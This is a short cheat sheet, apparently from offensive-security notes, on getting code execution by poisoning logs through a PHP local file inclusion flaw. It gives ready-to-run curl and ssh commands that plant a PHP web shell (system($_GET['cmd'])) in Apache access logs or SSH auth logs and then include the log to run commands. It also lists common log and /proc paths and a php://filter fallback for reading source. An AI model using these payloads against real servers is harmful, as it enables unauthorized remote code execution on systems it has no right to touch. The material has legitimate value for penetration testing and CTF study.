# PHP LFI Log Poisoning

When LFI exists and PHP processes the included file, inject PHP into logs and include them for code execution.

**Apache access log poison:**
```bash
# Inject PHP into User-Agent (Apache writes it to access.log)
curl -A '<?php system($_GET["cmd"]); ?>' http://<TARGET>/
# Include the log:
curl "http://<TARGET>/page.php?file=/var/log/apache2/access.log&cmd=id"
```

**Common log paths:**
```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log     # RHEL/CentOS
/proc/self/fd/2               # stderr
/proc/self/environ            # User-Agent in HTTP_USER_AGENT env var
```

**SSH auth log poison** (if SSH is running):
```bash
ssh '<?php system($_GET["cmd"]); ?>'@<TARGET>  # invalid user — still gets logged
# Include: /var/log/auth.log or /var/log/secure
```

**PHP filter chain as fallback** (when log path is unknown): Use `php://filter/convert.base64-encode/resource=` to read source code and discover the log path.
